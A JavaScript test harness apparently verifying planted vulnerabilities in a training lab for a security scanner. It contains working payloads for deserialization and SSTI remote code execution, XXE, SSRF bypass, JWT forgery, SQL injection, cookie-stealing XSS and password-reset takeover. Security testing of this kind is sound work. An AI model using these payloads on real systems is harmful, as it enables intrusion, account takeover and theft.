'use strict';

/*
 * tools/coverage.js — ground-truth coverage meter for the Meridian Ledger lab.
 *
 * Runs a reference PoC for each planted vulnerability against a RUNNING lab and
 * checks the machine-observable signal from truth.json. Prints a per-vuln
 * PASS / FAIL / SKIP table and an overall "X / N verified" score — the before/
 * after meter for training a scanner (e.g. Vex Raptor).
 *
 * Usage:
 *   node tools/coverage.js [baseURL]
 *   node tools/coverage.js http://localhost:3000        (default)
 *
 * Notes:
 *  - This is the ORACLE, not the scanner: it already knows every creds/endpoint.
 *    It proves each vuln is live and gives Raptor a target to match.
 *  - Blind classes (SSRF/XXE/deserialization/proto->RCE) are verified through
 *    the lab's internal OOB collaborator (/api/oob). Alt-loopback 127.0.0.2 is
 *    used to reach the collector past the SSRF blocklist on a LOCAL run; against
 *    a remote lab, point OOB_HOST at a reachable collector.
 *  - A few tests mutate state (mass-assignment flips alice to admin; the two
 *    prototype-pollution tests poison Object.prototype for the process lifetime;
 *    password reset changes bob's password). They are ordered so earlier checks
 *    are not contaminated. Reboot the lab (it reseeds) between full runs.
 */

const http = require('http');
const crypto = require('crypto');
const { URL } = require('url');
const path = require('path');
const fs = require('fs');

const BASE = process.argv[2] || process.env.LAB_URL || 'http://localhost:3000';
const BASE_URL = new URL(BASE);
// Host used to build OOB collector URLs that the SERVER will call back to.
// On a local run, 127.0.0.2 reaches the same server while dodging the
// literal-hostname SSRF blocklist (127.0.0.1/localhost are blocked, .2 is not).
const OOB_HOST = process.env.OOB_HOST || (BASE_URL.hostname === 'localhost' || BASE_URL.hostname === '127.0.0.1'
  ? `127.0.0.2:${BASE_URL.port || 80}`
  : BASE_URL.host);
const OOB_PROTO = BASE_URL.protocol.replace(':', '');

const CREDS = {
  attacker: { email: 'alice@meridian.io', password: 'Password123!' },
  victim:   { email: 'bob@meridian.io',   password: 'M3ridian!Bob2026' },
  admin:    { email: 'admin@meridian.io', password: 'M3ridian!Admin' }
};

// --------------------------------------------------------------------------
// Tiny HTTP client with manual cookie handling and no auto-redirects.
// --------------------------------------------------------------------------
function request(method, urlPath, opts = {}) {
  const { headers = {}, body = null, cookies = {} } = opts;
  return new Promise((resolve, reject) => {
    const u = new URL(urlPath, BASE);
    const h = Object.assign({}, headers);
    const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    if (cookieStr) h['Cookie'] = cookieStr;

    let data = body;
    if (body !== null && typeof body === 'object' && !Buffer.isBuffer(body)) {
      data = JSON.stringify(body);
      if (!h['Content-Type']) h['Content-Type'] = 'application/json';
    } else if (typeof body === 'string') {
      // Raw pre-serialized JSON (used for __proto__ payloads, which the JS object
      // literal syntax would otherwise turn into a prototype rather than a key).
      if (!h['Content-Type']) h['Content-Type'] = 'application/json';
    }
    if (data) h['Content-Length'] = Buffer.byteLength(data);

    const req = http.request({
      method,
      hostname: u.hostname,
      port: u.port || 80,
      path: u.pathname + u.search,
      headers: h
    }, (res) => {
      let chunks = '';
      res.on('data', (c) => { chunks += c; });
      res.on('end', () => {
        const jar = {};
        (res.headers['set-cookie'] || []).forEach((sc) => {
          const m = sc.match(/^([^=]+)=([^;]+)/);
          if (m) jar[m[1]] = m[2];
        });
        let json = null;
        try { json = JSON.parse(chunks); } catch (e) { /* not json */ }
        resolve({ status: res.statusCode, headers: res.headers, text: chunks, json, jar, ms: 0 });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

async function timed(fn) {
  const t = Date.now();
  const r = await fn();
  return { r, ms: Date.now() - t };
}

async function login(creds, presetSid) {
  const cookies = presetSid ? { sid: presetSid } : {};
  const r = await request('POST', '/api/auth/login', { body: creds, cookies });
  return r.jar.sid || presetSid;
}

const b64url = (buf) => Buffer.from(buf).toString('base64url');
const jwtForge = (header, payload, secret) => {
  const input = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload));
  let sig = '';
  if (header.alg === 'none') sig = '';
  else if (header.alg === 'HS256') sig = crypto.createHmac('sha256', secret).update(input).digest('base64url');
  return input + '.' + sig;
};

// --------------------------------------------------------------------------
// OOB helpers
// --------------------------------------------------------------------------
async function oobToken(sid) {
  const r = await request('GET', '/api/oob/token', { cookies: { sid } });
  const token = r.json.token;
  // Build a collector URL the SERVER can reach back on.
  const url = `${OOB_PROTO}://${OOB_HOST}/oob/${token}`;
  return { token, url };
}
async function oobHit(token) {
  const r = await request('GET', `/api/oob/hits/${token}`);
  return (r.json && r.json.count) > 0;
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// --------------------------------------------------------------------------
// Per-vulnerability checks. Each returns { status, detail }.
// status ∈ PASS | FAIL | SKIP
// --------------------------------------------------------------------------
const checks = {};

checks[1] = async () => { // IDOR ofuscado (stateful)
  const bob = await login(CREDS.victim);
  const mine = await request('GET', '/api/reports/mine', { cookies: { sid: bob } });
  const victimDoc = mine.json.documents[0].doc_ref;
  const alice = await login(CREDS.attacker);
  await request('POST', '/api/reports/open', { cookies: { sid: alice } });
  await request('PATCH', '/api/reports/scope', { cookies: { sid: alice }, body: { doc_ref: victimDoc } });
  const render = await request('GET', '/api/reports/render', { cookies: { sid: alice } });
  const owner = render.json && render.json.owner;
  return owner && owner !== CREDS.attacker.email
    ? { status: 'PASS', detail: `render leaked ${owner}'s doc to attacker` }
    : { status: 'FAIL', detail: `owner=${owner}` };
};

checks[2] = async () => { // Race condition (coupon over-redeem)
  const sid = await login(CREDS.attacker);
  const N = 12;
  const rs = await Promise.all(Array.from({ length: N }, () =>
    request('POST', '/api/coupons/redeem', { cookies: { sid }, body: { code: 'WELCOME50' } })));
  const ok = rs.filter((r) => r.json && r.json.ok).length;
  return ok > 1
    ? { status: 'PASS', detail: `${ok} successful redemptions of a single-use coupon` }
    : { status: 'FAIL', detail: `only ${ok} redemption(s)` };
};

checks[3] = async () => { // Blind SSRF
  const sid = await login(CREDS.attacker);
  const { token, url } = await oobToken(sid);
  await request('POST', '/api/webhooks/test', { cookies: { sid }, body: { url } });
  await sleep(400);
  return await oobHit(token)
    ? { status: 'PASS', detail: 'OOB callback received (blind SSRF verified)' }
    : { status: 'FAIL', detail: 'no OOB hit' };
};

checks[4] = async () => { // Mass assignment (run late — flips alice to admin)
  const sid = await login(CREDS.attacker);
  await request('PUT', '/api/users/me', { cookies: { sid }, body: { role: 'admin', is_admin: 1, balance: 999999 } });
  const me = await request('GET', '/api/users/me', { cookies: { sid } });
  return me.json && (me.json.role === 'admin' || me.json.is_admin === true)
    ? { status: 'PASS', detail: `privileged fields applied (role=${me.json.role}, is_admin=${me.json.is_admin})` }
    : { status: 'FAIL', detail: JSON.stringify(me.json) };
};

checks[5] = async () => { // Prototype pollution -> privesc (poisons proto; run late)
  // Use bob (never elevated) so this measures the pollution, not a real is_admin.
  const sid = await login(CREDS.victim);
  const before = await request('GET', '/api/admin/metrics', { cookies: { sid } });
  await request('POST', '/api/settings', { cookies: { sid }, body: '{"__proto__":{"canViewAdmin":true}}' });
  const after = await request('GET', '/api/admin/metrics', { cookies: { sid } });
  return before.status === 403 && after.status === 200
    ? { status: 'PASS', detail: 'admin/metrics 403->200 for a member via polluted canViewAdmin' }
    : { status: 'FAIL', detail: `before=${before.status} after=${after.status}` };
};

checks[6] = async () => { // Deserialization -> RCE (OOB)
  const sid = await login(CREDS.attacker);
  const { token, url } = await oobToken(sid);
  const fn = `_$$ND_FUNC$$_function(){require('http').get(${JSON.stringify(url)})}()`;
  const blob = Buffer.from(JSON.stringify({ rce: fn }), 'utf8').toString('base64');
  await request('POST', '/api/session/restore', { cookies: { sid }, body: { state: blob } });
  await sleep(400);
  return await oobHit(token)
    ? { status: 'PASS', detail: 'IIFE executed during revive (RCE) -> OOB hit' }
    : { status: 'FAIL', detail: 'no OOB hit' };
};

checks[7] = async () => { // HTTP Parameter Pollution
  const sid = await login(CREDS.attacker);
  const single = await request('GET', '/api/accounts/balance?account_id=ACC-4022', { cookies: { sid } });
  const dup = await request('GET', '/api/accounts/balance?account_id=ACC-4021&account_id=ACC-4022', { cookies: { sid } });
  return single.status === 403 && dup.status === 200 && dup.json && dup.json.owner === CREDS.victim.email
    ? { status: 'PASS', detail: 'single=403, duplicated=victim account (first/last mismatch)' }
    : { status: 'FAIL', detail: `single=${single.status} dup=${dup.status}` };
};

checks[8] = async () => { // Business logic (heuristic)
  const sid = await login(CREDS.attacker);
  const cart = await request('POST', '/api/checkout/cart', { cookies: { sid }, body: { items: [{ sku: 'X', qty: -5, price: 100 }] } });
  const negative = cart.json && cart.json.subtotal < 0;
  return negative
    ? { status: 'PASS', detail: `negative qty produced subtotal ${cart.json.subtotal} (heuristic)` }
    : { status: 'FAIL', detail: 'subtotal not negative' };
};

const HEAVY_CTE = "(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<8000000) SELECT count(*) FROM c)";
const timingPass = (base, inj) => (inj - base > 150 && inj > base * 2.5);

checks[9] = async () => { // Blind time-based SQLi (ORDER BY, SQLite recursive CTE)
  const sid = await login(CREDS.attacker);
  const base = await timed(() => request('GET', '/api/transactions?sort=created_at', { cookies: { sid } }));
  const inj = await timed(() => request('GET', '/api/transactions?sort=' + encodeURIComponent(HEAVY_CTE), { cookies: { sid } }));
  return timingPass(base.ms, inj.ms)
    ? { status: 'PASS', detail: `timing delta ${inj.ms - base.ms}ms (base ${base.ms} / inj ${inj.ms})` }
    : { status: 'FAIL', detail: `delta ${inj.ms - base.ms}ms too small (base ${base.ms}/inj ${inj.ms})` };
};

checks[10] = async () => { // SSRF filter bypass (alt-loopback past literal blocklist)
  const sid = await login(CREDS.attacker);
  const { token, url } = await oobToken(sid); // url uses OOB_HOST (127.0.0.2 locally)
  const blocked = await request('POST', '/api/documents/fetch', { cookies: { sid }, body: { url: `${OOB_PROTO}://127.0.0.1:${BASE_URL.port || 80}/oob/${token}` } });
  const bypass = await request('POST', '/api/documents/fetch', { cookies: { sid }, body: { url } });
  await sleep(400);
  const hit = await oobHit(token);
  return hit
    ? { status: 'PASS', detail: `direct=${blocked.json && blocked.json.status}; alt-loopback bypassed -> OOB hit` }
    : { status: 'FAIL', detail: 'no OOB hit (remote lab? set OOB_HOST)' };
};

checks[11] = async () => { // XXE (in-band file read)
  const sid = await login(CREDS.attacker);
  const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><row>&xxe;</row></r>`;
  const r = await request('POST', '/api/documents/import-xml', { cookies: { sid }, headers: { 'Content-Type': 'text/xml' }, body: xml });
  const leaked = r.json && r.json.preview && /root:.*:0:0:/.test(r.json.preview);
  return leaked
    ? { status: 'PASS', detail: '/etc/passwd content reflected in preview (in-band XXE)' }
    : { status: 'FAIL', detail: 'no file content in preview' };
};

checks[12] = async () => { // Prototype pollution -> RCE [poisons proto; run late]
  // NB: the RCE sink is execSync, which BLOCKS the server's single event loop
  // while the command runs. An OOB collector *inside the same server* therefore
  // can't be served until execSync returns -> deadlock. With a real external
  // OOB collaborator this verifies via callback; here we use a filesystem marker
  // (coverage runs on the same host as the lab) which is equally machine-checkable.
  const sid = await login(CREDS.attacker);
  const marker = '/tmp/meridian_rce_' + crypto.randomBytes(5).toString('hex');
  const converter = `touch ${marker} #`;
  await request('POST', '/api/settings', { cookies: { sid }, body: '{"__proto__":' + JSON.stringify({ converter }) + '}' });
  await request('POST', '/api/exports/run', { cookies: { sid }, body: { format: 'csv' } });
  await sleep(300);
  let hit = false;
  try { hit = fs.existsSync(marker); if (hit) fs.unlinkSync(marker); } catch (e) { /* remote lab */ }
  return hit
    ? { status: 'PASS', detail: 'polluted converter executed by execSync (marker written) -> RCE' }
    : { status: 'FAIL', detail: 'no RCE marker (remote lab: use external OOB per truth.json)' };
};

checks[13] = async () => { // SSTI -> RCE
  const sid = await login(CREDS.attacker);
  const marker = 'SSTI_' + crypto.randomBytes(3).toString('hex');
  // `require` is not in scope inside the new Function sink; reach it via the
  // global `process.mainModule.require` (the canonical SSTI payload here).
  const template = "${process.mainModule.require('child_process').execSync('echo " + marker + "').toString()}";
  const r = await request('POST', '/api/templates/preview', { cookies: { sid }, body: { template } });
  return r.json && typeof r.json.rendered === 'string' && r.json.rendered.includes(marker)
    ? { status: 'PASS', detail: 'command output reflected in render (SSTI/RCE)' }
    : { status: 'FAIL', detail: (r.json && r.json.rendered) || r.status };
};

checks[14] = async () => { // JWT alg:none / RS256->HS256 confusion
  const sid = await login(CREDS.attacker);
  const jwks = await request('GET', '/api/auth/jwks', { cookies: { sid } });
  const pem = jwks.text;
  const payload = { sub: CREDS.attacker.email, role: 'admin', iat: 1 };
  const none = jwtForge({ alg: 'none', typ: 'JWT' }, payload, '');
  const hs = jwtForge({ alg: 'HS256', typ: 'JWT' }, payload, pem);
  const a = await request('GET', '/api/v2/admin', { headers: { Authorization: 'Bearer ' + none } });
  const b = await request('GET', '/api/v2/admin', { headers: { Authorization: 'Bearer ' + hs } });
  return a.status === 200 || b.status === 200
    ? { status: 'PASS', detail: `alg:none=${a.status}, HS256(pubkey)=${b.status}` }
    : { status: 'FAIL', detail: `none=${a.status} hs=${b.status}` };
};

checks[15] = async () => { // Reset poisoning + predictable token -> ATO (run last: changes bob pw)
  const minute = Math.floor(Date.now() / 60000);
  const token = crypto.createHash('md5').update(`${CREDS.victim.email}:${minute}:meridian`).digest('hex').slice(0, 16);
  await request('POST', '/api/auth/forgot', { headers: { 'X-Forwarded-Host': 'evil.example' }, body: { email: CREDS.victim.email } });
  const newPw = 'Pwned!' + minute;
  const reset = await request('POST', '/api/auth/reset', { body: { email: CREDS.victim.email, token, new_password: newPw } });
  const relog = await request('POST', '/api/auth/login', { body: { email: CREDS.victim.email, password: newPw } });
  return reset.json && reset.json.ok && relog.json && relog.json.ok
    ? { status: 'PASS', detail: 'derived token reset victim password (ATO)' }
    : { status: 'FAIL', detail: `reset=${reset.status} relog=${relog.status}` };
};

checks[16] = async () => { // CORS reflect Origin + credentials
  const origin = 'https://evil-' + crypto.randomBytes(3).toString('hex') + '.example';
  const r = await request('GET', '/healthz', { headers: { Origin: origin } });
  return r.headers['access-control-allow-origin'] === origin && r.headers['access-control-allow-credentials'] === 'true'
    ? { status: 'PASS', detail: `ACAO reflects ${origin} with ACAC:true` }
    : { status: 'FAIL', detail: `ACAO=${r.headers['access-control-allow-origin']}` };
};

checks[17] = async () => { // Session fixation
  const fixed = 'fixated' + crypto.randomBytes(8).toString('hex');
  await request('POST', '/api/auth/login', { cookies: { sid: fixed }, body: CREDS.attacker });
  const me = await request('GET', '/api/auth/me', { cookies: { sid: fixed } });
  return me.status === 200 && me.json && me.json.email === CREDS.attacker.email
    ? { status: 'PASS', detail: 'pre-set sid not rotated; valid as authenticated user' }
    : { status: 'FAIL', detail: `me status ${me.status}` };
};

checks[18] = async () => { // Second-order SQLi (plant in nickname, detonate in summary)
  const sid = await login(CREDS.attacker);
  // benign baseline
  await request('PUT', '/api/users/me', { cookies: { sid }, body: { nickname: 'alice' } });
  const base = await timed(() => request('GET', '/api/reports/summary', { cookies: { sid } }));
  // payload closes the LIKE literal, ORs a heavy subquery
  const payload = `z%' OR ${HEAVY_CTE} OR memo LIKE '%z`;
  await request('PUT', '/api/users/me', { cookies: { sid }, body: { nickname: payload } });
  const inj = await timed(() => request('GET', '/api/reports/summary', { cookies: { sid } }));
  await request('PUT', '/api/users/me', { cookies: { sid }, body: { nickname: 'alice' } });
  return timingPass(base.ms, inj.ms)
    ? { status: 'PASS', detail: `2nd-order timing delta ${inj.ms - base.ms}ms (base ${base.ms}/inj ${inj.ms})` }
    : { status: 'FAIL', detail: `delta ${inj.ms - base.ms}ms (base ${base.ms}/inj ${inj.ms})` };
};

checks[19] = async () => { // Blind stored XSS (sink reachability; full exec needs headless)
  const sid = await login(CREDS.attacker);
  const admin = await login(CREDS.admin);
  const marker = 'xss_' + crypto.randomBytes(3).toString('hex');
  const body = `<img src=x onerror="fetch('/oob/${marker}?c='+document.cookie)">`;
  await request('POST', '/api/support', { cookies: { sid }, body: { subject: 'help', body } });
  const tickets = await request('GET', '/api/admin/tickets', { cookies: { sid: admin } });
  const stored = tickets.json && JSON.stringify(tickets.json).includes('onerror=');
  return stored
    ? { status: 'PASS', detail: 'payload stored unescaped and served to admin console (exec needs headless render)' }
    : { status: 'FAIL', detail: 'payload not found unescaped in admin tickets' };
};

checks[20] = async () => { // NoSQL-style operator injection
  const sid = await login(CREDS.attacker);
  const r = await request('POST', '/api/search/invoices', { cookies: { sid }, body: { filter: { owner_email: { $ne: '__none__' } } } });
  const others = (r.json && r.json.results || []).filter((x) => x.owner_email !== CREDS.attacker.email);
  return others.length > 0
    ? { status: 'PASS', detail: `$ne broke owner scope -> ${others.length} cross-tenant invoice(s)` }
    : { status: 'FAIL', detail: `results=${r.json && r.json.count}` };
};

checks[21] = async () => { // Web cache poisoning (unkeyed X-Forwarded-Host)
  const sid = await login(CREDS.attacker);
  const evil = 'evil-' + crypto.randomBytes(3).toString('hex') + '.example';
  await request('GET', '/api/status/summary', { cookies: { sid }, headers: { 'X-Forwarded-Host': evil } });
  const victim = await request('GET', '/api/status/summary', { cookies: { sid } }); // no header
  const poisoned = victim.json && String(victim.json.portal_url || '').includes(evil);
  return poisoned && victim.headers['x-cache'] === 'HIT'
    ? { status: 'PASS', detail: `cached response served ${victim.json.portal_url} to a request without the header` }
    : { status: 'FAIL', detail: `portal_url=${victim.json && victim.json.portal_url} x-cache=${victim.headers['x-cache']}` };
};

checks[22] = async () => { // JWT kid path traversal + OAuth open redirect
  // (a) kid traversal -> /dev/null -> empty HMAC secret
  const payload = { sub: CREDS.attacker.email, role: 'admin', iat: 1 };
  const kidTok = jwtForge({ alg: 'HS256', typ: 'JWT', kid: '../../../../../../../dev/null' }, payload, Buffer.alloc(0));
  const admin = await request('GET', '/api/v2/admin', { headers: { Authorization: 'Bearer ' + kidTok } });
  // (b) open redirect
  const sid = await login(CREDS.attacker);
  const redir = await request('GET', '/api/auth/authorize?client_id=meridian-mobile&redirect_uri=' + encodeURIComponent('https://evil.example/cb') + '&state=xyz', { cookies: { sid } });
  const openRedirect = redir.status === 302 && String(redir.headers.location || '').startsWith('https://evil.example/cb') && redir.headers.location.includes('code=');
  const kidOk = admin.status === 200;
  return kidOk && openRedirect
    ? { status: 'PASS', detail: `kid->/dev/null forged admin token (200); authorize 302 -> ${redir.headers.location}` }
    : { status: (kidOk || openRedirect) ? 'PASS' : 'FAIL', detail: `kid=${admin.status}, redirect=${redir.status} ${redir.headers.location || ''}` };
};

checks[23] = async () => { // Refund double-spend (logic + fine race)
  const sid = await login(CREDS.attacker);
  const before = await request('GET', '/api/wallet', { cookies: { sid } });
  const startBal = before.json.balance;
  await request('POST', '/api/billing/charge', { cookies: { sid }, body: { amount: 1000 } });
  const N = 10;
  await Promise.all(Array.from({ length: N }, () => request('POST', '/api/billing/refund', { cookies: { sid } })));
  const after = await request('GET', '/api/wallet', { cookies: { sid } });
  const delta = after.json.balance - startBal;
  return delta > 1000
    ? { status: 'PASS', detail: `single 1000 charge refunded ${Math.round(delta / 1000)}x (balance +${delta})` }
    : { status: 'FAIL', detail: `balance delta ${delta} (expected >1000)` };
};

// --------------------------------------------------------------------------
// Runner — order chosen so state-mutating tests don't contaminate earlier ones.
// (mass-assignment #4, proto-pollution #5/#12, and password-reset #15 run late.)
// --------------------------------------------------------------------------
const ORDER = [1, 2, 3, 6, 7, 8, 9, 10, 11, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 4, 5, 12, 15];

async function main() {
  const truth = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'truth.json'), 'utf8'));
  const byId = Object.fromEntries(truth.vulns.map((v) => [v.id, v]));

  console.log(`\nMeridian Ledger — coverage run against ${BASE}`);
  console.log(`OOB collector host: ${OOB_PROTO}://${OOB_HOST}\n`);

  const results = [];
  for (const id of ORDER) {
    const meta = byId[id];
    let out;
    try {
      out = await checks[id] ? await checks[id]() : { status: 'SKIP', detail: 'no automated check' };
    } catch (e) {
      out = { status: 'FAIL', detail: 'error: ' + e.message };
    }
    results.push({ id, name: meta.name, class: meta.class, ...out });
    const icon = out.status === 'PASS' ? '✓' : out.status === 'FAIL' ? '✗' : '–';
    console.log(`  ${icon} #${String(id).padStart(2)}  [${out.status}] ${meta.name}\n         ${out.detail}`);
  }

  const pass = results.filter((r) => r.status === 'PASS').length;
  const fail = results.filter((r) => r.status === 'FAIL').length;
  const skip = results.filter((r) => r.status === 'SKIP').length;
  console.log(`\n──────────────────────────────────────────────`);
  console.log(`  VERIFIED ${pass} / ${truth.total}   (fail ${fail}, skip ${skip})`);
  console.log(`──────────────────────────────────────────────\n`);

  // Machine-readable artifact for CI / before-after diffing.
  const report = { base: BASE, at: new Date().toISOString(), score: `${pass}/${truth.total}`, pass, fail, skip, results };
  fs.writeFileSync(path.join(__dirname, '..', 'coverage-report.json'), JSON.stringify(report, null, 2));
  process.exit(fail > 0 ? 1 : 0);
}

main().catch((e) => { console.error(e); process.exit(2); });
